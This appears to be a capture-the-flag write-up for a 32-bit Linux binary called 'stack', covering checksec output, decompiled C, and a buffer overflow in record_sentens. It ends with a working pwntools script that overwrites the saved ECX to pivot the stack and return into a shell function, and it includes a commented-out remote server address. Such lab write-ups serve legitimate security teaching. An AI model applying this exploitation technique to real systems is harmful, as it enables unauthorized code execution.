# Stack

## Checksec

```sh
❯ checksec stack
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```


## Reverse Analysis

```c
int main(void)

{
  int choice;
  char buf [24];
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  buf[0] = '\0';
  buf[1] = '\0';
  buf[2] = '\0';
  buf[3] = '\0';
  buf[4] = '\0';
  buf[5] = '\0';
  buf[6] = '\0';
  buf[7] = '\0';
  buf[8] = '\0';
  buf[9] = '\0';
  buf[10] = '\0';
  buf[11] = '\0';
  buf[12] = '\0';
  buf[13] = '\0';
  buf[14] = '\0';
  buf[15] = '\0';
  buf[16] = '\0';
  buf[17] = '\0';
  buf[18] = '\0';
  buf[19] = '\0';
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  fflush((FILE *)0x0);
  puts("input your name: ");
  read(0,name,0x1e);
  puts("hello: ");
  fflush((FILE *)0x0);
  write(1,name,0x1e);
  fflush((FILE *)0x0);
  do {
    PutsChoice();
    scanf("%d",&choice);
    if (choice == 2) {
      puts("note: ");
      fflush((FILE *)0x0);
      puts(buf);
      fflush((FILE *)0x0);
      exit(0);
    }
    if (choice == 3) {
      say_goodbye();
    }
    else {
      if (choice != 1) {
        exit(0);
      }
      printf("we in addr 0x%x\n",buf);
      record_sentens(buf);
    }
  } while ((choice != 3) && ((choice == 1 || (choice == 2))));
  return 0;
}
```

```c
void record_sentens(char *param_1)

{
  char input [184];
  int i;
  
  puts("Please input your note: ");
  fflush((FILE *)0x0);
  read(0,input,0xb4);
  fflush((FILE *)0x0);
  for (i = 0; input[i] != '\0'; i = i + 1) {
    param_1[i] = input[i];
  }
  return;
}
```

```asm
080486ff 8d 4c 24 04     LEA        ECX=>Stack[0x4],[ESP + 0x4]
08048703 83 e4 f0        AND        ESP,0xfffffff0
08048706 ff 71 fc        PUSH       dword ptr [ECX + local_res0]
08048709 55              PUSH       EBP
0804870a 89 e5           MOV        EBP,ESP
0804870c 51              PUSH       ECX
----------------------------------------------------------------
080488c2 b8 00 00        MOV        EAX,0x0
        00 00
080488c7 8b 4d fc        MOV        ECX,dword ptr [EBP + local_c]
080488ca c9              LEAVE
080488cb 8d 61 fc        LEA        ESP=>local_res0,[ECX + -0x4]
080488ce c3              RET
```

To note that the register `ecx` is introduced by the compiler to perform the `mprefered-stack-boundary` optimization.


## Vulnerability

Function `record_sentens` is vulnerable to a buffer overflow attack.
The `input` buffer is 184 bytes long, while the `buf` buffer in the main function is only 24 bytes long.
This means that if an attacker inputs more than 24 bytes, they can overwrite the `buf` buffer and potentially control the program's execution flow.

## Exploit

So in order to exploit this vulnerability, we need to overwrite the ecx to control the stack pointer, then we can control the return address of the `main` function.

register ecx is next to the buf

```python
#!/usr/bin/python
from pwn import *

context.log_level = "debug"

context.arch = "i386"
r = process("./stack")
# r = remote("124.16.75.117", 51008)

main_buf_len = 0x18
ebx_len = 0x4
local_res0_len = 0x4
ebp_len = 0x4

r.sendlineafter(b"input your name:", b"")
r.sendlineafter(b"choice:>>", b"1")
buf_addr = r.recvuntil(b"\nP")[14:-2]
buf_addr = buf_addr.decode("utf-8")
buf_addr = int(buf_addr, 16)
print(hex(buf_addr))
shelladdr = 0x8048644
exitaddr = 0x804889B
shelladdr_addr = buf_addr
r.sendlineafter(
    b"lease input your note:",
    p32(shelladdr)
    + p32(exitaddr)
    + b"a" * (main_buf_len - 8)
    + p32(shelladdr_addr + 4)  # ecx = esp + 4
    + b"x" * ebp_len,  # ebp
)
# gdb.attach(r, "b *0x80488cb")
r.sendlineafter(b"choice:>>", b"3")
r.interactive()
```
